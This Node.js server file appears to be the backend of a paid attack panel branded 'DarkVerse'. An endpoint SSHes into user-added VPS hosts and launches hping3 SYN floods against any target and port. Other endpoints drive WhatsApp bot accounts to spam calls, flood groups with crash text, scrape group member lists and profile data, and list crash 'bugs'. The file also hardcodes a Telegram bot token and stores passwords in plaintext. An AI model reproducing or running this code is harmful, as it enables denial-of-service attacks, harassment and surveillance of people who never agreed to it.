const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@bellachu/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  //{ bug_id: "crash_spam", bug_name: "Spam Crash" },
  { bug_id: "click", bug_name: "DELAY BY ZSNZ" },
  { bug_id: "android", bug_name: "BLANK BY ZSNZ" },
  { bug_id: "invisible", bug_name: "COMBO HARD BY ZSNZ" },
  { bug_id: "ios_invis", bug_name: "ANDRO DELAY BY ZSNZ" },
  { bug_id: "ios_noinvis", bug_name: "FC BY ZSNZ (UJI COBA)" },
  //{ bug_id: "ui_kill", bug_name: "Android UI Killer" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

function getOnlineStats() {
  const validatedUsers = new Set();
  if (wss.clients) {
    for (const client of wss.clients) {
      if (client.readyState === WebSocket.OPEN && client.dashboardUsername) {
        validatedUsers.add(client.dashboardUsername);
      }
    }
  }

  const onlineUsers = validatedUsers.size;
  const activeSocketConnections = wss.clients
    ? [...wss.clients].filter(client => client.readyState === WebSocket.OPEN).length
    : 0;

  return {
    onlineUsers,
    activeConnections: activeSocketConnections,
  };
}

function sendStats(ws) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  const stats = getOnlineStats();
  ws.send(JSON.stringify({
    type: 'stats',
    ...stats,
  }));
}

function broadcastStats() {
  const statsPayload = JSON.stringify({
    type: 'stats',
    ...getOnlineStats(),
  });

  if (!wss.clients) return;
  for (const client of wss.clients) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(statsPayload);
    }
  }
}

const TOKEN = "8711018605:AAHf5CnymV795I0sp2aoG0RbgwOd5WsIgu8"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const ID_GROUP = [
    -1003794926703,
];

const ID_GROUP_UTAMA = [
    -1003794926703,
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 1017656782;
  
wss.on('connection', function (ws, req) {
  let username;
  let statsInterval = null;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validKey.username,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));
        ws.dashboardUsername = validKey.username;
        broadcastStats();

            if (statsInterval) clearInterval(statsInterval);
            statsInterval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            sendStats(ws);
            }, 10000);
            sendStats(ws);
      }
      if (data.type === 'stats') {
        sendStats(ws);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;
        broadcastStats();

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (statsInterval) {
      clearInterval(statsInterval);
      statsInterval = null;
    }
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
    broadcastStats();
  });
});

// Ganti listen jadi ini:
const wsPort = 2288;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 2288;




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);dulu
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await DelayVisi(sock, groupJid);
          await newDelay(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function resolveKeyInfo(key) {
  if (!key) return null;
  let keyInfo = activeKeys[key];
  if (keyInfo) return keyInfo;

  const list = loadKeyList();
  const record = list.find(e => e.sessionKey === key);
  if (!record) return null;

  const created = new Date(record.lastLogin).getTime();
  keyInfo = {
    username: record.username,
    created,
    expires: created + 10 * 60 * 1000,
  };
  activeKeys[key] = keyInfo;
  return keyInfo;
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
    {
      image: "https://files.catbox.moe/nx8lo7.jpg",
      title: "IMMORTAL X SILENCE",
      desc: "Buy Acces Chat @PangeranTzyy"
    },
    {
      image: "https://files.catbox.moe/smsk8v.jpg",
      title: "IMMORTAL X SILENCE",
      desc: "Join channel @Tzynotdevreals01"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  telegramId: user.telegramId || "",
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    telegramId: user.telegramId || "",
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

const GLOBAL_SENDER_FOLDER = "__global__";
const GLOBAL_SENDER_TIMEZONE = "Asia/Jakarta";

function canManageGlobalSender(role = "member") {
  const normalizedRole = normalizeRoleName(role);
  return normalizedRole === "owner" || normalizedRole === "developer";
}

function getGlobalSenderDailyLimit(role = "member") {
  return null;
}

function canUseGlobalSender(role = "member") {
  return true;
}

function formatSenderQuotaDate(date = new Date()) {
  const parts = new Intl.DateTimeFormat("en-GB", {
    timeZone: GLOBAL_SENDER_TIMEZONE,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).formatToParts(date);

  const year = parts.find(part => part.type === "year")?.value || "0000";
  const month = parts.find(part => part.type === "month")?.value || "00";
  const day = parts.find(part => part.type === "day")?.value || "00";
  return `${year}-${month}-${day}`;
}

function ensureGlobalSenderUsageState(user) {
  const today = formatSenderQuotaDate();
  let changed = false;

  if (!user.globalSenderUsage || typeof user.globalSenderUsage !== "object") {
    user.globalSenderUsage = { date: today, count: 0 };
    return true;
  }

  if (user.globalSenderUsage.date !== today) {
    user.globalSenderUsage.date = today;
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  if (!Number.isFinite(user.globalSenderUsage.count) || user.globalSenderUsage.count < 0) {
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  return changed;
}

function getGlobalSenderQuotaPayload(user) {
  ensureGlobalSenderUsageState(user);

  const normalizedRole = normalizeRoleName(user?.role || "member");
  const limit = getGlobalSenderDailyLimit(normalizedRole);
  const used = Number(user?.globalSenderUsage?.count || 0);
  const unlimited = limit === null;

  return {
    role: normalizedRole,
    canAdd: canManageGlobalSender(normalizedRole),
    canUse: canUseGlobalSender(normalizedRole),
    used,
    limit,
    remaining: unlimited ? null : Math.max(limit - used, 0),
    unlimited,
    date: user?.globalSenderUsage?.date || formatSenderQuotaDate(),
  };
}

function getGlobalSenderDeniedMessage(role = "member") {
  return `Role ${String(role).toUpperCase()} tidak diizinkan memakai Global Sender.`;
}

function getGlobalSenderLimitMessage(role = "member", quota = {}) {
  const limit = quota.limit ?? getGlobalSenderDailyLimit(role);
  const used = quota.used ?? 0;
  return `Limit Global Sender untuk role ${String(role).toUpperCase()} sudah habis (${used}/${limit}).`;
}

function consumeGlobalSenderQuota(user) {
  const quota = getGlobalSenderQuotaPayload(user);

  if (!quota.canUse) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderDeniedMessage(quota.role),
    };
  }

  if (!quota.unlimited && quota.used >= quota.limit) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderLimitMessage(quota.role, quota),
    };
  }

  if (!quota.unlimited) {
    user.globalSenderUsage.count = quota.used + 1;
  }

  return {
    ok: true,
    changed: !quota.unlimited,
    quota: getGlobalSenderQuotaPayload(user),
  };
}

const GLOBAL_SENDER_COOLDOWN_MS = 60 * 60 * 1000;
const PRIVATE_SENDER_COOLDOWN_MS = 10 * 60 * 1000;
const GLOBAL_SENDER_COOLDOWN_FILE = path.join(__dirname, "globalSenderCooldown.json");

function readGlobalSenderCooldown() {
  try {
    if (!fs.existsSync(GLOBAL_SENDER_COOLDOWN_FILE)) {
      return { lastUsedAt: 0, lastUsedBy: null };
    }

    const raw = JSON.parse(fs.readFileSync(GLOBAL_SENDER_COOLDOWN_FILE, "utf8"));
    const lastUsedAt = Number(raw?.lastUsedAt || 0);

    return {
      lastUsedAt: Number.isFinite(lastUsedAt) && lastUsedAt > 0 ? lastUsedAt : 0,
      lastUsedBy: raw?.lastUsedBy ? String(raw.lastUsedBy) : null,
    };
  } catch (err) {
    console.error("❌ Failed to read global sender cooldown:", err.message);
